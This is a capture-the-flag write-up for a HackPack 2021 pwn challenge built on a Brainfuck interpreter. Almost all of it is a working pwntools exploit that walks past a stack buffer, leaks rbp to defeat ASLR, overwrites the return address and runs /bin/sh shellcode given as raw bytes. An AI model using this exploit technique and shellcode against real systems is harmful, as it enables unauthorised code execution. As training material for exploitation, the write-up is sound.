```
I wasn't allowed to put the real title of this challenge. I wonder what it was?

nc ctf2021.hackpack.club 10996
```
[mind-blown](https://ctf2021.hackpack.club/files/2634097c70153a1b2e62960f3410e89d/mind-blown?token=eyJ1c2VyX2lkIjoxODMsInRlYW1faWQiOjY0LCJmaWxlX2lkIjozMH0.YH2IRw.AKkbSlGfG7e441BQztbm2ScDwqI)

We do just a little reverse engineering to get some sense of the program.
We can see a `runProgram` function which takes no arguments and uses a buffer
of size 4096 to save the brainfuck program.

```python
from pwn import *

BUFFER_SIZE = 4096
p = remote("ctf2021.hackpack.club", 10996)

shellcode = (b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7'
             b'\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05')

# We add 8 to the buffer size to skip the canary
# Then read the rbp to defeat ASLR
# And finally write the stack address and our shellcode to the stack
bf_program = b'>'*(BUFFER_SIZE + 8) + b'.>'*8 + b',>'*(8 + len(shellcode))

p.recvuntil("in your program: ")
p.sendline(str(len(bf_program)))
p.recvuntil("Enter your program text below:\n")
p.send(bf_program)

leak = b""
while len(leak) < 8:
    leak += p.recv(8 - len(leak))
rbp = u64(leak)
print(f"leaked rbp: {hex(rbp)}")

# runProgram has 0 parameters, so we go back 16 bytes (address and rbp of main)
shellcode_addr = p64(rbp - 16)
p.send(shellcode_addr + shellcode)
p.interactive()
```
